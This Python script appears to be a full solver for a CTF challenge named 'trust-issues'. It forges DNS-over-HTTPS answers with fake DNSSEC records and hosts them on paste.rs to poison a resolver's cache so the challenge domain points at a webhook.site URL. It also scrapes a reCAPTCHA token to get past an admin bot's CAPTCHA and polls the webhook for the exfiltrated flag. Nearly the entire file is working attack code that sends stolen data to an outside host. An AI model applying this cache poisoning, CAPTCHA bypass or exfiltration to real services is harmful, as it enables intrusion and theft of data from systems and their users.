#!/usr/bin/env python3
import argparse
import base64
import hashlib
import json
import re
import sys
import time
import urllib.parse

import requests


ZONE = "trust-issues.tjc.tf."
SITEKEY = "6LfKZOIsAAAAAE8inmDZkdgHaKmBQmJmGpLtezdB"
BOT_URL = "https://admin-bot.tjctf.org/trust-issues"
DEFAULT_RESOLVER = "https://dnsresolver-7d44aa7f9b4479fe.tjc.tf/"


def encode_name(name: str) -> bytes:
    name = name.lower().rstrip(".")
    out = b""
    for label in name.split("."):
        out += bytes([len(label)]) + label.encode()
    return out + b"\x00"


def dnskey_keytag(flags: int, protocol: int, algorithm: int, public_key: bytes) -> int:
    rdata = (
        flags.to_bytes(2, "big")
        + protocol.to_bytes(1, "big")
        + algorithm.to_bytes(1, "big")
        + public_key
    )
    acc = 0
    for i, b in enumerate(rdata):
        acc += b if i & 1 else b << 8
    acc += (acc >> 16) & 0xFFFF
    return acc & 0xFFFF


def create_webhook(session: requests.Session) -> str:
    resp = session.post("https://webhook.site/token", timeout=20)
    resp.raise_for_status()
    return resp.json()["uuid"]


def build_poison_payload(webhook_uuid: str) -> str:
    target = f"webhook.site/{webhook_uuid}"
    ttl = 100000

    flags, protocol, algorithm = 257, 3, 17
    public_key = b"FAKEKSK0123456789"
    public_key_b64 = base64.b64encode(public_key).decode()
    keytag = dnskey_keytag(flags, protocol, algorithm, public_key)
    dnskey_rdata = (
        flags.to_bytes(2, "big")
        + protocol.to_bytes(1, "big")
        + algorithm.to_bytes(1, "big")
        + public_key
    )
    digest = hashlib.sha256(encode_name(ZONE) + dnskey_rdata).hexdigest().upper()

    payload = {
        "Status": 0,
        "Answer": [
            {"name": ZONE, "type": 1, "TTL": ttl, "data": target},
            {
                "name": ZONE,
                "type": 48,
                "TTL": ttl,
                "data": f"{flags} {protocol} {algorithm} {public_key_b64}",
            },
            {
                "name": ZONE,
                "type": 43,
                "TTL": ttl,
                "data": f"{keytag} {algorithm} 2 {digest}",
            },
            {
                "name": ZONE,
                "type": 46,
                "TTL": ttl,
                "data": "a 17 3 300 4102444800 0 1 trust-issues.tjc.tf. AAAA",
            },
        ],
    }
    return json.dumps(payload)


def upload_payload(session: requests.Session, content: str) -> str:
    resp = session.post("https://paste.rs", data=content.encode(), timeout=20)
    resp.raise_for_status()
    return resp.text.strip()


def poison_cache(session: requests.Session, resolver: str, upstream: str) -> None:
    resp = session.get(
        resolver,
        params={"name": "warmup.attacker.invalid", "type": "A", "upstream": upstream},
        timeout=20,
    )
    if resp.status_code not in (200, 404, 500):
        resp.raise_for_status()


def get_current_target(session: requests.Session, resolver: str) -> str | None:
    resp = session.get(
        resolver, params={"name": "trust-issues.tjc.tf", "type": "A"}, timeout=20
    )
    if resp.status_code != 200:
        return None
    return resp.json().get("data")


def wait_for_poison(session: requests.Session, resolver: str, webhook_uuid: str, timeout: int) -> None:
    want = f"webhook.site/{webhook_uuid}"
    deadline = time.time() + timeout
    while time.time() < deadline:
        resp = session.get(
            resolver, params={"name": "trust-issues.tjc.tf", "type": "A"}, timeout=20
        )
        if resp.status_code == 200:
            data = resp.json()
            if data.get("data") == want:
                return
        time.sleep(5)
    raise TimeoutError("poisoned A record never became active")


def get_recaptcha_token(session: requests.Session, bot_url: str) -> str:
    origin = "{uri.scheme}://{uri.netloc}".format(uri=urllib.parse.urlparse(bot_url))
    co = base64.b64encode(origin.encode()).decode().replace("=", ".")
    anchor = session.get(
        "https://www.google.com/recaptcha/api2/anchor",
        params={
            "ar": "1",
            "k": SITEKEY,
            "co": co,
            "hl": "en",
            "size": "invisible",
            "cb": "x",
        },
        timeout=20,
    )
    anchor.raise_for_status()
    seed = re.search(r'id="recaptcha-token" value="([^"]+)"', anchor.text)
    if not seed:
        raise RuntimeError("failed to extract recaptcha seed")
    reload = session.post(
        "https://www.google.com/recaptcha/api2/reload",
        params={"k": SITEKEY},
        data={"v": "", "reason": "q", "k": SITEKEY, "c": seed.group(1), "sa": "", "co": co},
        timeout=20,
    )
    reload.raise_for_status()
    token = re.search(r'\["rresp","([^"]+)"', reload.text)
    if not token:
        raise RuntimeError("failed to extract recaptcha token")
    return token.group(1)


def submit_bot(session: requests.Session, bot_url: str, resolver: str, recaptcha: str) -> None:
    resp = session.post(
        bot_url,
        data={"url": resolver, "recaptcha_code": recaptcha},
        allow_redirects=False,
        timeout=20,
    )
    if resp.status_code != 302:
        raise RuntimeError(f"unexpected bot response: {resp.status_code}")
    location = resp.headers.get("location", "")
    if "admin%20will%20visit%20your%20URL" not in location:
        raise RuntimeError(f"bot rejected payload: {location}")


def wait_for_flag(session: requests.Session, webhook_uuid: str, timeout: int) -> str:
    api = f"https://webhook.site/token/{webhook_uuid}/requests?sorting=newest"
    deadline = time.time() + timeout
    while time.time() < deadline:
        resp = session.get(api, headers={"Accept": "application/json"}, timeout=20)
        resp.raise_for_status()
        for item in resp.json().get("data", []):
            url = item.get("url", "")
            match = re.search(r"[?&]flag=([^&]+)", url)
            if match:
                return urllib.parse.unquote(match.group(1))
        time.sleep(2)
    raise TimeoutError("flag never arrived at webhook")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--resolver", default=DEFAULT_RESOLVER)
    parser.add_argument("--bot", default=BOT_URL)
    parser.add_argument("--cache-timeout", type=int, default=360)
    parser.add_argument("--flag-timeout", type=int, default=60)
    args = parser.parse_args()

    session = requests.Session()
    current = get_current_target(session, args.resolver)
    match = re.fullmatch(r"webhook\.site/([0-9a-f-]{36})", current or "")
    if match:
        webhook_uuid = match.group(1)
    else:
        webhook_uuid = create_webhook(session)
        upstream = upload_payload(session, build_poison_payload(webhook_uuid))
        poison_cache(session, args.resolver, upstream)
        wait_for_poison(session, args.resolver, webhook_uuid, args.cache_timeout)
    recaptcha = get_recaptcha_token(session, args.bot)
    submit_bot(session, args.bot, args.resolver, recaptcha)
    flag = wait_for_flag(session, webhook_uuid, args.flag_timeout)
    print(flag)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise
    except Exception as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
